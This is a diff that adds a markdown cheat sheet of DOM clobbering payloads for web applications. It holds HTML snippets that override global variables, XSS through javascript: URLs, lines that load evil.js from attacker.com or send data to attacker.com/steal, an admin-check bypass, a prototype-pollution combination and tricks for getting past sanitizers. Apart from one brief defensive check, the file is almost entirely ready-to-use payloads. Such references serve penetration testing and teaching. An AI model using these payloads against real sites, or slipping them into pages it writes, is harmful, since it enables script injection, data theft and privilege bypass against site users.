@@ -1,0 +1,346 @@
+# DOM Clobbering Payloads
+
+## ========================================
+## BASIC DOM CLOBBERING
+## ========================================
+
+# Override window properties
+<img id="x" src="x">
+<script>alert(x)</script>  // x is now the img element
+
+# Named form elements
+<form id="myForm">
+  <input name="action" value="malicious">
+</form>
+<script>
+  // myForm.action is now "malicious"
+</script>
+
+## ========================================
+## COMMON CLOBBERING TARGETS
+## ========================================
+
+# Window object
+<img id="test">
+// window.test now references the img element
+
+# Document properties
+<form name="forms"></form>
+// document.forms.forms now references the form
+
+# Attributes
+<a id="x" href="javascript:alert(1)">
+<script>
+  if (x.href) location = x.href;
+</script>
+
+## ========================================
+## FORM CLOBBERING
+## ========================================
+
+# Override form action
+<form id="targetForm">
+  <input name="action" value="http://attacker.com">
+</form>
+
+# Override form method
+<form id="targetForm">
+  <input name="method" value="POST">
+</form>
+
+## ========================================
+## ANCHOR TAG CLOBBERING
+## ========================================
+
+# Clobber with href
+<a id="config" href="http://attacker.com/config.json">
+
+# Multiple elements with same name
+<a id="x"></a>
+<a id="x"></a>
+<script>
+  // x is now an HTMLCollection
+</script>
+
+## ========================================
+## NESTED CLOBBERING
+## ========================================
+
+# Clobber nested properties
+<form id="config">
+  <input name="apiUrl" value="http://attacker.com/api">
+</form>
+
+<script>
+  // config.apiUrl is now "http://attacker.com/api"
+  fetch(config.apiUrl);  // Attacker controlled
+</script>
+
+## ========================================
+## HTMLCOLLECTION CLOBBERING
+## ========================================
+
+# Create HTMLCollection
+<a id="x"></a>
+<a id="x" name="y"></a>
+
+<script>
+  x[0]  // First element
+  x.y   // Named element
+</script>
+
+## ========================================
+## ATTRIBUTE OVERRIDE
+## ========================================
+
+# Override with data attributes
+<div id="config" data-url="http://attacker.com"></div>
+
+# Override with custom attributes
+<a id="x" href="http://attacker.com" name="y">
+
+## ========================================
+## EXPLOITING VULNERABLE CODE
+## ========================================
+
+# Vulnerable pattern
+<script>
+  if (window.config) {
+    location = window.config.url;
+  }
+</script>
+
+# Exploit
+<form id="config">
+  <input name="url" value="javascript:alert(1)">
+</form>
+
+## ========================================
+## XSS VIA DOM CLOBBERING
+## ========================================
+
+# Payload 1
+<form id="x">
+  <input name="action" value="javascript:alert(1)">
+</form>
+<script>
+  location = x.action;
+</script>
+
+# Payload 2
+<a id="scriptSrc" href="http://attacker.com/evil.js">
+<script>
+  var script = document.createElement('script');
+  script.src = scriptSrc.href;
+  document.body.appendChild(script);
+</script>
+
+## ========================================
+## IFRAME CLOBBERING
+## ========================================
+
+# Name attribute
+<iframe name="config" src="http://attacker.com"></iframe>
+
+# Access from parent
+<script>
+  // window.config references the iframe
+</script>
+
+## ========================================
+## OBJECT/EMBED CLOBBERING
+## ========================================
+
+# Object tag
+<object id="x" data="http://attacker.com/malicious.swf">
+
+# Embed tag
+<embed id="x" src="http://attacker.com/malicious.swf">
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Clobber with SVG
+<svg><a id="x" href="javascript:alert(1)">
+
+# Clobber with image
+<img id="x" src="x" onerror="alert(1)">
+
+# Clobber with anchor
+<a id="x" href="javascript:alert(1)">
+
+## ========================================
+## PROTOTYPE POLLUTION VIA CLOBBERING
+## ========================================
+
+# Combined attack
+<form id="__proto__">
+  <input name="polluted" value="true">
+</form>
+
+## ========================================
+## REAL-WORLD EXPLOITATION
+## ========================================
+
+# Example 1: API endpoint override
+<!-- Vulnerable code -->
+<script>
+  fetch(window.apiConfig.endpoint, {
+    method: 'POST',
+    body: data
+  });
+</script>
+
+<!-- Exploit -->
+<form id="apiConfig">
+  <input name="endpoint" value="http://attacker.com/steal">
+</form>
+
+# Example 2: Authentication bypass
+<!-- Vulnerable code -->
+<script>
+  if (window.isAdmin) {
+    showAdminPanel();
+  }
+</script>
+
+<!-- Exploit -->
+<img id="isAdmin">
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Direct property access
+if (window.config) { ... }
+
+# Pattern 2: Nested properties
+location = window.config.redirectUrl;
+
+# Pattern 3: Dynamic script loading
+script.src = window.scriptSource;
+
+# Pattern 4: API calls
+fetch(window.apiEndpoint);
+
+## ========================================
+## BYPASSING SANITIZATION
+## ========================================
+
+# If innerHTML is sanitized
+<form id="x"><input name="y" value="payload"></form>
+
+# If attribute filtering exists
+<a id="x" href="data:text/html,<script>alert(1)</script>">
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify vulnerable code patterns
+grep -r "window\." app.js
+grep -r "document\." app.js
+
+# 2. Find clobberable properties
+Look for global variable access
+
+# 3. Inject clobbering payload
+<form id="targetVariable">
+
+# 4. Verify override
+Check if property is clobbered
+
+# 5. Craft exploitation
+Redirect, XSS, or data theft
+
+## ========================================
+## BROWSER-SPECIFIC CLOBBERING
+## ========================================
+
+# Chrome/Safari
+Named elements accessible via window
+
+# Firefox
+Similar behavior with some differences
+
+# IE/Edge
+Legacy window.name clobbering
+
+## ========================================
+## DEFENSIVE DETECTION
+## ========================================
+
+# Check for clobbering
+if (window.config && typeof window.config === 'object' 
+    && !(window.config instanceof HTMLElement)) {
+  // Safe to use
+}
+
+## ========================================
+## EXPLOITATION PAYLOADS
+## ========================================
+
+# Redirect attack
+<a id="redirect" href="http://attacker.com">
+<script>
+  if (redirect) location = redirect.href;
+</script>
+
+# Script source override
+<a id="cdnUrl" href="http://attacker.com/evil.js">
+<script>
+  var s = document.createElement('script');
+  s.src = cdnUrl.href;
+  document.body.appendChild(s);
+</script>
+
+# Configuration override
+<form id="appConfig">
+  <input name="apiKey" value="attacker_key">
+  <input name="endpoint" value="http://attacker.com">
+</form>
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Browser developer console
+Inject payloads via HTML injection
+
+# Burp Suite
+Identify injection points
+Test clobbering vectors
+
+# DOM Invader (Burp extension)
+Automated DOM clobbering detection
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# User-controlled HTML
+Comments, profiles, posts
+
+# Markdown rendering
+If HTML tags allowed
+
+# Rich text editors
+WYSIWYG editors
+
+# SVG uploads
+SVG with embedded HTML
+
+## ========================================
+## COMBINED ATTACKS
+## ========================================
+
+# DOM Clobbering + XSS
+<a id="callback" href="javascript:alert(document.domain)">
+
+# DOM Clobbering + Open Redirect
+<a id="nextUrl" href="http://attacker.com">
+
+# DOM Clobbering + CSRF
+Override CSRF token source
